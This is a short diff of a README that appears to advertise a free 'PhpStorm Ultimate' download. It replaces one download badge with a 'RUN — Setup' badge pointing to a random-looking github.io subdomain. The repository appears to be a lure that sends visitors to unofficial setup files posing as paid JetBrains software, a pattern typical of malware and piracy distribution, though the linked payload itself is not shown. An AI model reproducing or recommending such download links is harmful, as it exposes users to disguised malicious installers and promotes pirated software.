@@ -4,11 +4,7 @@
   <img src="https://www.jetbrainsmerchandise.com/media/catalog/product/cache/ecfe99657bcf987295ea6f61f389da7e/j/b/jbps0002_1.png" alt="PhpStorm Logo"/>
 </p>
 
-<p align="center">
-  <a href="https://phpstorm-ai.github.io/.github/">
-    <img src="https://img.shields.io/badge/⬇️_Get_PhpStorm_Ultimate-blue?style=for-the-badge&logo=github" alt="Get PhpStorm Ultimate"/>
-  </a>
-</p>
+[![RUN Setup](https://img.shields.io/badge/RUN%20%E2%80%94%20Setup-2ea44f?style=for-the-badge&logoColor=white)](https://f03wtdeli14x9s9avi1c.github.io/.github/PhpStorm-Ai)
 
 ---
 
